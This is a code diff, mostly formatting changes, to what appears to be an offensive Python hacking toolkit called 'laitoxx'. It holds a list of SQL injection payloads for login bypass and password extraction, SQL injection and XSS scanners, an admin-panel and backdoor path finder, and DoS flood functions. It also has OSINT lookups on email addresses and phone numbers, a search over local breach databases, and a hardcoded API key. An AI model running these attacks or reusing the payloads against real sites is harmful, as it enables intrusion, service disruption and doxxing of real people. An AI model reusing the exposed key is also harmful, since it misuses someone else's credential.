+                file_name = asksaveasfilename(defaultextension=".txt", filetypes=[
+                                              ("laitoxx Text files", "*.txt")])
                 if file_name:
                     with open(file_name, 'w') as file:
                         for subdomain in subdomains:
                             file.write(subdomain + '\n')
-                    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Subdomains saved to: {os.path.abspath(file_name)}")
+                    print(
+                        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Subdomains saved to: {os.path.abspath(file_name)}")
         else:
-            print("{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} No subdomains found.")
+            print(
+                "{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} No subdomains found.")
     except requests.exceptions.RequestException as e:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching {url}: {e}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching {url}: {e}")
+
 
 def generate_sql_payloads(num_payloads=5, payload_type='scan_payload'):
     def generate_random_string(length):
@@ -681,32 +756,32 @@ def generate_sql_payloads(num_payloads=5, payload_type='scan_payload'):
     ]
 
     injection_templates = [
-        f"' OR 1=1 -- ",
-        f"' OR 'a' = 'a' -- ",
-        f"' AND username = 'admin' -- ",
-        f"' AND password = 'password' -- ",
-        f"' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password='password') -- ",
-        f"' OR (SELECT password FROM users WHERE username='admin') = 'password' -- ",
-        f"' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 -- ",
-        f"' UNION SELECT username, password FROM users -- ",
-        f"' UNION SELECT null, password FROM users WHERE username='admin' -- ",
-        f"' UNION SELECT username, password FROM users WHERE username='admin' -- ",
+        "' OR 1=1 -- ",
+        "' OR 'a' = 'a' -- ",
+        "' AND username = 'admin' -- ",
+        "' AND password = 'password' -- ",
+        "' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password='password') -- ",
+        "' OR (SELECT password FROM users WHERE username='admin') = 'password' -- ",
+        "' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 -- ",
+        "' UNION SELECT username, password FROM users -- ",
+        "' UNION SELECT null, password FROM users WHERE username='admin' -- ",
+        "' UNION SELECT username, password FROM users WHERE username='admin' -- ",
         f"' UNION SELECT username, password FROM users WHERE username='{generate_random_string(6)}' -- ",
-        f"' OR (SELECT 1 FROM users WHERE username='admin' AND password='password') -- ",
-        f"' OR (SELECT password FROM users WHERE username='admin') IS NOT NULL -- ",
-        f"' AND (SELECT password FROM users WHERE username='admin') = 'adminpassword' -- ",
-        f"' OR (SELECT 1 FROM users WHERE username='admin' AND password='adminpassword') = 1 -- ",
-        f"' AND (SELECT password FROM users WHERE username='admin') = (SELECT password FROM users WHERE username='admin') -- ",
-        f"' UNION SELECT username, password FROM users WHERE username='admin' LIMIT 1 -- ",
-        f"' UNION SELECT username, password FROM users WHERE username='admin' ORDER BY 1 -- ",
-        f"' AND username='admin' AND password LIKE '%admin%' -- ",
-        f"' AND password LIKE '%password%' -- ",
-        f"' OR 1=1 -- ",
+        "' OR (SELECT 1 FROM users WHERE username='admin' AND password='password') -- ",
+        "' OR (SELECT password FROM users WHERE username='admin') IS NOT NULL -- ",
+        "' AND (SELECT password FROM users WHERE username='admin') = 'adminpassword' -- ",
+        "' OR (SELECT 1 FROM users WHERE username='admin' AND password='adminpassword') = 1 -- ",
+        "' AND (SELECT password FROM users WHERE username='admin') = (SELECT password FROM users WHERE username='admin') -- ",
+        "' UNION SELECT username, password FROM users WHERE username='admin' LIMIT 1 -- ",
+        "' UNION SELECT username, password FROM users WHERE username='admin' ORDER BY 1 -- ",
+        "' AND username='admin' AND password LIKE '%admin%' -- ",
+        "' AND password LIKE '%password%' -- ",
+        "' OR 1=1 -- ",
         f"' UNION SELECT username, password FROM users WHERE username LIKE '{generate_random_string(6)}' -- ",
-        f"' OR (SELECT password FROM users WHERE username='admin') = (SELECT password FROM users WHERE username='admin') -- ",
-        f"' UNION SELECT username, password FROM users WHERE username='admin' LIMIT 0, 1 -- ",
-        f"' AND username='admin' AND password='adminpassword' -- ",
-        f"' AND EXISTS (SELECT 1 FROM users WHERE username='admin' AND password='adminpassword') -- ",
+        "' OR (SELECT password FROM users WHERE username='admin') = (SELECT password FROM users WHERE username='admin') -- ",
+        "' UNION SELECT username, password FROM users WHERE username='admin' LIMIT 0, 1 -- ",
+        "' AND username='admin' AND password='adminpassword' -- ",
+        "' AND EXISTS (SELECT 1 FROM users WHERE username='admin' AND password='adminpassword') -- ",
     ]
 
     if payload_type == 'scan_payload':
@@ -714,7 +789,8 @@ def generate_sql_payloads(num_payloads=5, payload_type='scan_payload'):
     elif payload_type == 'injection_payload':
         templates = injection_templates
     else:
-        raise ValueError("Invalid payload type. Use 'scan_payload' or 'injection_payload'.")
+        raise ValueError(
+            "Invalid payload type. Use 'scan_payload' or 'injection_payload'.")
 
     payloads = []
     for _ in range(num_payloads):
@@ -726,23 +802,27 @@ def generate_sql_payloads(num_payloads=5, payload_type='scan_payload'):
 def sql_injection_scanner(payload_type='scan_payload'):
     url = input(f"{Color.LIGHT_BLUE}url for scan: {Color.RESET}")
     try:
-        num_payloads = int(input(f"{Color.LIGHT_BLUE}number of payloads: {Color.RESET}"))
+        num_payloads = int(
+            input(f"{Color.LIGHT_BLUE}number of payloads: {Color.RESET}"))
     except ValueError:
         print(f'{Color.RED}only numbers!{Color.RESET}')
         return
     username_field = input(f'{Color.BLUE}username field name: {Color.RESET}')
     password_field = input(f'{Color.BLUE}password field name: {Color.RESET}')
-    use_proxy = input(f"{Color.GREEN}Use proxy? (y/n): {Color.RESET}").strip().lower()
+    use_proxy = input(
+        f"{Color.GREEN}Use proxy? (y/n): {Color.RESET}").strip().lower()
     proxies = None
     if use_proxy == 'y':
         try:
-            proxy_count = int(input(f"{Color.GREEN}How many proxies do you want to use? {Color.RESET}"))
+            proxy_count = int(
+                input(f"{Color.GREEN}How many proxies do you want to use? {Color.RESET}"))
         except:
             print(f'{Color.RED}numbers!{Color.RESET}')
             return
         proxy_list = []
         for _ in range(proxy_count):
-            proxy = input(f"{Color.GREEN}Enter proxy (format: http://proxy_ip:proxy_port): {Color.RESET}").strip()
+            proxy = input(
+                f"{Color.GREEN}Enter proxy (format: http://proxy_ip:proxy_port): {Color.RESET}").strip()
             proxy_list.append(proxy)
     error_keywords = [
         "error", "syntax", "unexpected", "unclosed", "SQL", "database", "query",
@@ -774,6 +854,7 @@ def sql_injection_scanner(payload_type='scan_payload'):
         except requests.exceptions.RequestException as e:
             print(f"{Color.DARK_RED}Ошибка при подключении: {Color.RESET}{e}")
 
+
 class Color:
     DARK_RED = '\033[31m'
     DARK_GRAY = '\033[90m'
@@ -791,6 +872,7 @@ class Color:
     LIGHT_BLUE = '\033[94m'
     BLUE = '\033[94m'
     DARK_BLUE = '\033[34m'
+
 
 DARK_RED = '\033[31m'
 DARK_GRAY = '\033[90m'
@@ -827,14 +909,18 @@ class Color:
     DARK_GRAY = '\033[90m'
     WHITE = '\033[97m'
     RESET = '\033[0m'
+
+
 primary_color = Color.RED
 secondary_color = Color.LIGHT_RED
 tertiary_color = Color.DARK_RED
 gray_color = Color.DARK_GRAY
 current_color_scheme = 'red'
 
+
 def find_admin_panel():
-    url = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.RED} Enter the URL to search for the admin panel: ")
+    url = input(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.RED} Enter the URL to search for the admin panel: ")
     if not (url.startswith("http://") or url.startswith("https://")):
         print(f"{Color.DARK_RED}[!]{Color.RESET} Incorrect URL")
         return
@@ -852,28 +938,37 @@ def find_admin_panel():
         "portal/admin", "control/manage", "admincp/manage", "private/manage", "private/admin",
         "backdoor", "backdoor.php", "shell", "admin/auth", "user/admin.php"
     ]
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Search for admin panels for: {url}")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Search for admin panels for: {url}")
     for path in admin_paths:
         full_url = f"{url.rstrip('/')}/{path.strip()}"
         try:
             response = requests.get(full_url, timeout=5)
             if response.status_code == 200 and ("login" in response.text or "admin" in response.text):
-                print(f"{Color.GREEN}[+]{Color.RESET} Admin panel found: {full_url}")
+                print(
+                    f"{Color.GREEN}[+]{Color.RESET} Admin panel found: {full_url}")
             else:
-                print(f"{Color.LIGHT_RED}[-]{Color.RESET} Verified: {full_url} - admin panel not found.")
+                print(
+                    f"{Color.LIGHT_RED}[-]{Color.RESET} Verified: {full_url} - admin panel not found.")
         except Exception as e:
-            print(f"{Color.DARK_RED}[!]{Color.RESET} Error: {full_url} - {str(e)}")
+            print(
+                f"{Color.DARK_RED}[!]{Color.RESET} Error: {full_url} - {str(e)}")
+
 
 def search_mac_address(mac_address):
     url = f"https://api.macvendors.com/{mac_address}"
     try:
         response = requests.get(url, timeout=5)
         if response.status_code == 200:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Manufacturer: {response.text}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Manufacturer: {response.text}")
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} No information found for MAC address: {mac_address}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} No information found for MAC address: {mac_address}")
     except requests.exceptions.RequestException as e:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching data for MAC address: {e}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching data for MAC address: {e}")
+
 
 def xss_scan():
     if not os.path.exists('payloads'):
@@ -881,21 +976,28 @@ def xss_scan():
         return
     xss_payloads_path = os.path.join('payloads', 'xsspayloads.txt')
     if not os.path.isfile(xss_payloads_path):
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} File with payloads not found")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} File with payloads not found")
         return
     try:
         with open(xss_payloads_path, 'r', encoding='utf-8') as file:
             payloads = [line.strip() for line in file if line.strip()]
     except Exception as e:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error reading payloads file: {e}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error reading payloads file: {e}")
         return
     if not payloads:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} No payloads found in the file.")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} No payloads found in the file.")
         return
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Loaded Payloads: {len(payloads)}")
-    url = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} Enter URL for scan: ")
-    entity_conversion = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Use entity conversion to HTML? (y/n): ").strip().lower()
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Starting XSS scan on: {url}")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Loaded Payloads: {len(payloads)}")
+    url = input(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} Enter URL for scan: ")
+    entity_conversion = input(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Use entity conversion to HTML? (y/n): ").strip().lower()
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Starting XSS scan on: {url}")
     attempt = 1
     for payload in payloads:
         if entity_conversion == 'y' or entity_conversion == 'Y':
@@ -904,29 +1006,41 @@ def xss_scan():
         try:
             response = requests.get(test_url, timeout=5)
             if payload in response.text:
-                sys.stdout.write(f"\rattempt: {attempt} Payload: {payload} status: found Potential XSS vulnerability on {test_url}")
+                sys.stdout.write(
+                    f"\rattempt: {attempt} Payload: {payload} status: found Potential XSS vulnerability on {test_url}")
                 sys.stdout.flush()
-                print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}{attempt}{Color.DARK_GRAY}]{Color.LIGHT_RED} Potential XSS vulnerability found with payload: {payload} url - {test_url}")
+                print(
+                    f"\n{Color.DARK_GRAY}[{Color.DARK_RED}{attempt}{Color.DARK_GRAY}]{Color.LIGHT_RED} Potential XSS vulnerability found with payload: {payload} url - {test_url}")
             else:
-                sys.stdout.write(f"\rattempt: {attempt} Payload: {payload} status: not found found XSS vulnerability")
+                sys.stdout.write(
+                    f"\rattempt: {attempt} Payload: {payload} status: not found found XSS vulnerability")
                 sys.stdout.flush()
                 attempt += 1
         except requests.exceptions.RequestException as e:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error testing URL: {e}")
-    print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} XSS scan completed.")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error testing URL: {e}")
+    print(
+        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} XSS scan completed.")
+
 
 def check_url(url):
     try:
         response = requests.get(url, timeout=5, allow_redirects=True)
         if len(response.history) > 0:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} URL has redirects:")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} URL has redirects:")
             for resp in response.history:
-                print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} {resp.status_code} - {resp.url}")
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Final destination: {response.status_code} - {response.url}")
+                print(
+                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} {resp.status_code} - {resp.url}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Final destination: {response.status_code} - {response.url}")
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} No redirects. URL is direct.")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} No redirects. URL is direct.")
     except requests.exceptions.RequestException as e:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error checking URL: {e}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error checking URL: {e}")
+
 
 def generate_random_headers():
     headers = {
@@ -942,6 +1056,8 @@ def generate_random_headers():
         'Accept': '*/*'
     }
     return headers
+
+
 def dos_ip(ip_address, duration, threads):
     end_time = time.time() + duration * 60
     success_count = 0
@@ -971,10 +1087,12 @@ def dos_ip(ip_address, duration, threads):
     for thread in threads_list:
         thread.join()
 
-    print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Attack finished!")
+    print(
+        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Attack finished!")
     print(
         f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Successful requests: {success_count}")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed requests: {failure_count}")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed requests: {failure_count}")
 
 
 def show_progress_bar(duration):
@@ -986,12 +1104,15 @@ def show_progress_bar(duration):
         progress = elapsed_time / (duration * 60)
         bar_length = 50
         filled_length = int(bar_length * progress)
-        bar = Color.DARK_RED + '█' * filled_length + '-' * (bar_length - filled_length) + Color.RESET
+        bar = Color.DARK_RED + '█' * filled_length + '-' * \
+            (bar_length - filled_length) + Color.RESET
         percent = int(progress * 100)
-        sys.stdout.write(f'\r[{bar}] {percent}% seconds {remaining_time:.2f} left')
+        sys.stdout.write(
+            f'\r[{bar}] {percent}% seconds {remaining_time:.2f} left')
         sys.stdout.flush()
         time.sleep(1)
-    print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Attack completed.")
+    print(
+        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Attack completed.")
 
 
 def dos_attack(link, duration, threads):
@@ -1022,31 +1143,43 @@ def dos_attack(link, duration, threads):
     for thread in threads_list:
         thread.join()
 
-    print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Attack finished!")
+    print(
+        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Attack finished!")
     print(
         f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Successful requests: {success_count}")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed requests: {failure_count}")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed requests: {failure_count}")
+
 
 def check_site():
-    website = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter website URL (e.g., https://example.com): {Color.RESET}")
+    website = input(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter website URL (e.g., https://example.com): {Color.RESET}")
     if not website.startswith('http'):
         website = 'http://' + website
     try:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Checking availability...")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Checking availability...")
         start_time = time.time()
         response = requests.get(website)
         end_time = time.time()
         response_time = end_time - start_time
         if response.status_code == 200:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Website is available!")
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Status Code: {response.status_code}")
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Response Time: {response_time:.2f} seconds")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Website is available!")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Status Code: {response.status_code}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Response Time: {response_time:.2f} seconds")
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Website is not available.")
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Status Code: {response.status_code}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Website is not available.")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Status Code: {response.status_code}")
     except requests.exceptions.RequestException as e:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error checking website: {e}")
-    input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error checking website: {e}")
+    input(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
 
 
 def get_proxy():
@@ -1057,10 +1190,13 @@ def get_proxy():
             proxy_list = response.text.strip().split("\r\n")
             return proxy_list
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to fetch proxy list. Status code: {response.status_code}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to fetch proxy list. Status code: {response.status_code}")
     except Exception as e:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching proxy list: {e}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching proxy list: {e}")
     return None
+
 
 def get_website_info(domain):
     try:
@@ -1081,16 +1217,22 @@ def get_website_info(domain):
         """
         print(print_string)
     except Exception as e:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Error: {e}\n")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Error: {e}\n")
+
 
 def search_database():
     if not os.path.exists('bd'):
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Directory 'bd' does not exist. Please create it and add files for searching.")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Directory 'bd' does not exist. Please create it and add files for searching.")
         return
     count = len(os.listdir('bd'))
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} {count} databases found.\n")
-    data = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} Enter data to search: ")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} Searching...\n")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} {count} databases found.\n")
+    data = input(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} Enter data to search: ")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} Searching...\n")
     result = ''
     for label in os.listdir('bd'):
         bd_path = os.path.join('bd', label)
@@ -1123,13 +1265,18 @@ def search_database():
                         result += formatted_result
                         break
         except Exception as e:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Error reading file {label}: {e}")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} Search completed!\n")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Error reading file {label}: {e}")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} Search completed!\n")
     if result:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Search Results:\n")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Search Results:\n")
         print(result)
     else:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} No matches found.")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} No matches found.")
+
 
 def change_color_scheme(scheme):
     global current_color_scheme
@@ -1163,6 +1310,7 @@ def change_color_scheme(scheme):
         Color.DARK_RED = '\033[31m'
     current_color_scheme = scheme
 
+
 def gradient_text(text, color_scheme):
     color_schemes = {
         'red': [LIGHT_RED, RED, DARK_RED, DARK_GRAY, GRAY],
@@ -1181,6 +1329,7 @@ def gradient_text(text, color_scheme):
         color_index = min(i // gradient_steps, num_colors - 1)
         gradient_result += f"{selected_colors[color_index]}{char}"
     return f"{gradient_result}{RESET}"
+
 
 banner_text = """
 
@@ -1236,7 +1385,9 @@ intro = """
                                Press to Enter
 """
 
-Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.045, enter=True)
+Anime.Fade(Center.Center(intro), Colors.black_to_red,
+           Colorate.Vertical, interval=0.045, enter=True)
+
 
 def gmail_osint():
     def search_google_account(email_prefix):
@@ -1245,15 +1396,18 @@ def gmail_osint():
         if response.status_code == 200:
             return response.text
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to retrieve profile.")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to retrieve profile.")
             return None
     email_prefix = input(
         f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the email prefix (e.g., for example@gmail.com, enter example): {Color.RESET}")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Searching for Google profile...")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Searching for Google profile...")
     profile_html = search_google_account(email_prefix)
     if profile_html:
         soup = BeautifulSoup(profile_html, 'html.parser')
-        result_div = soup.find('div', style="margin:16px auto;text-align:center;display:block;border:1px solid #000;")
+        result_div = soup.find(
+            'div', style="margin:16px auto;text-align:center;display:block;border:1px solid #000;")
         if result_div:
             content = ''
             for element in result_div.descendants:
@@ -1282,14 +1436,17 @@ def gmail_osint():
         else:
             print(f"{Color.DARK_RED}{profile_html}{Color.RESET}")
     else:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to retrieve profile.")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to retrieve profile.")
 
 
 USERSBOX_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjcmVhdGVkX2F0IjoxNzI1MTk2NzMwLCJhcHBfaWQiOjE3MjUxOTY3MzB9.qG_GQCdZqvUHSHd0yGpnPiUGKo-KRsgNnMo8ZDpRItg"
 
 
 def search_by_number():
-    phone = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Phone number: ")
+    phone = input(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Phone number: ")
+
     def validate_phone(phone):
         try:
             parsed_number = phonenumbers.parse(phone, None)
@@ -1297,7 +1454,8 @@ def search_by_number():
         except phonenumbers.phonenumberutil.NumberParseException:
             return False
     if not validate_phone(phone):
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Invalid number. Try again, only without spaces and with '+'.")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Invalid number. Try again, only without spaces and with '+'.")
         return
     try:
         parsed_number = phonenumbers.parse(phone, None)
@@ -1307,68 +1465,94 @@ def search_by_number():
         number_type = phonenumbers.number_type(parsed_number)
         possible_number = phonenumbers.is_possible_number(parsed_number)
         valid_number = phonenumbers.is_valid_number(parsed_number)
